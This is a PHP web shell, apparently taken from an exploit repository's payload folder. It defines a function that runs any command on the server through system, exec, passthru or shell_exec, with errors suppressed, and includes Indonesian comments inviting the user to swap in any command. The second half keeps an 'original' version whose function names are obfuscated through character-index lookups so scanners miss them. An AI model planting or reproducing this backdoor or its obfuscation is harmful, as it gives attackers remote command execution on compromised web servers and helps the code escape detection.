<?php
/**
 * @file
 * x.php >> https://github.com/ardzz/exploit/blob/master/payload/cmd.php
 *
 */

/**
 * Main function.
 */
function miaomiao($miao) {
  if (function_exists('system')) {
    @ob_start();
    @system($miao);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif (function_exists('exec')) {
    @exec($miao, $results);
    $buff = "";
    foreach ($results as $result) {
      $buff .= $result;
    }
    return $buff;
  }
  elseif (function_exists('passthru')) {
    @ob_start();
    @passthru($miao);
    $buff = @ob_get_contents();
    @ob_end_clean();
    return $buff;
  }
  elseif (function_exists('shell_exec')) {
    $buff = @shell_exec($miao);
    return $buff;
  }
}

// Contoh perintah, silakan ganti sesuka hati.
echo miaomiao("ls -l");


// ----------- Original Source
// ----------- Start
// function miaomiao($miao) {
//   $key = str_split("0123456789abcdefghijklmnopqrstuvwxyz;`</>- |_=,.:ABCDEFGHIJKLMNOPQRSTUVWXYZ", "1");
//   if(((NULL)/*//*/.$key/*//*/[15].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)(((NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[34].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[22].(NULL)/*//*/))) {
//     @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[27].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/)();
//     @((NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[34].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[22].(NULL)/*//*/)($miao);
//     $buff = @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[16].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)();
//     @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[13].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/)();
//     return $buff;
//   } elseif(((NULL)/*//*/.$key/*//*/[15].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)(((NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/))) {
//     @((NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/)($miao,$results);
//     $buff = "";
//     foreach($results as $result) {
//     $buff .= $result;
//   }
//     return $buff;
//   } elseif(((NULL)/*//*/.$key/*//*/[15].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)//.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)(((NULL)/*//*/.$key/*//*/[25].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[17].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[27].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/))) {
//     @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[27].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/)();
//     @((NULL)/*//*/.$key/*//*/[25].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[17].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[27].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/)($miao);
//     $buff = @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[16].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)();
//     @((NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[11].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[13].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[10].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/)();
//     return $buff;
//   } elseif(((NULL)/*//*/.$key/*//*/[15].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[30].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[24].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[23].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[18].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[29].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/)(((NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[17].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/))) {
//     $buff = @((NULL)/*//*/.$key/*//*/[28].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[17].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[21].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[44].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[33].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[14].(NULL)/*//*/.(NULL)/*//*/.$key/*//*/[12].(NULL)/*//*/)($miao);
//     return $buff;
//   }
// }
// echo miaomiao("id"); // contoh perintah, silakan ganti sesuka hati
// ----------- End
?>
